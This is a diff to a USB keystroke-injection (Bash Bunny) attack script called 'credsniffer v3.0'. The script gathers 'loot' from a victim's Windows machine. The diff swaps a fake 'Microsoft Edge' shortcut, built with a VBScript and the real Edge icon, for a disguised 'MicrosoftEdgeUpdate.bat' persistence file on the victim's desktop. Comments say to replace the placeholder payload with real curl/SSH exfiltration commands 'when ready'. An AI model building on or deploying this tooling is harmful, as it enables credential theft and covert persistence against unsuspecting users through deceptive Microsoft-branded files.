@@ -117,38 +117,29 @@ Q STRING exit
 Q ENTER
 log INFO "STEP 5 OK: Drop command sent — Bash Bunny reads %%TEMP%%\.sysinfo after plugging in"
 
-#####################Fake Microsoft Edge Shortcut###########################
-# Creates a shortcut on H:\Desktop named "Microsoft Edge" that actually opens
-# a terminal. The icon is pulled from the real msedge.exe so it looks legit.
-# Uses cmd echo line-by-line into a temp VBScript — no PowerShell, no elevation.
-# Replace the echo payload line with a real POST/SSH command when ready.
+#####################Persistence Batch File on H:\Desktop##################
+# Drops a .bat file directly onto H:\Desktop using plain cmd echo — no quotes,
+# no VBScript, no PowerShell, no special characters that break on Swedish keyboard.
+# Replace the payload echo line with a real curl/SSH command when ready.
 
-log INFO "STEP 6: Planting fake Microsoft Edge shortcut on H:\\Desktop (no elevation)"
+log INFO "STEP 6: Dropping MicrosoftEdgeUpdate.bat onto H:\\Desktop"
 Q DELAY 1500
 Q GUI r
 Q DELAY 600
 Q STRING cmd
 Q ENTER
 Q DELAY 400
-Q STRING echo Set ws=CreateObject("WScript.Shell") > %TEMP%\mk.vbs
-Q ENTER
-Q STRING echo Set s=ws.CreateShortcut("H:\Desktop\Microsoft Edge.lnk") >> %TEMP%\mk.vbs
-Q ENTER
-Q STRING echo s.TargetPath = "cmd.exe" >> %TEMP%\mk.vbs
-Q ENTER
-Q STRING echo s.Arguments = "/c powershell -NoExit -Command echo This could be a POST or SSH command" >> %TEMP%\mk.vbs
-Q ENTER
-Q STRING echo s.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0" >> %TEMP%\mk.vbs
-Q ENTER
-Q STRING echo s.Save >> %TEMP%\mk.vbs
+Q STRING cd /d H:\Desktop
 Q ENTER
 Q DELAY 200
-Q STRING wscript //nologo %TEMP%\mk.vbs
+Q STRING echo @echo off> MicrosoftEdgeUpdate.bat
 Q ENTER
-Q DELAY 800
-Q STRING del /f %TEMP%\mk.vbs && exit
+Q STRING echo echo This could be a POST or SSH command>> MicrosoftEdgeUpdate.bat
 Q ENTER
-log INFO "STEP 6 OK: Shortcut planted — clicking it opens PowerShell payload"
+Q DELAY 200
+Q STRING exit
+Q ENTER
+log INFO "STEP 6 OK: MicrosoftEdgeUpdate.bat planted on H:\\Desktop"
 
 Q DELAY 1000
 log INFO "=== credsniffer v3.0 finished — loot at /root/loot/ | log: $LOG_FILE ==="
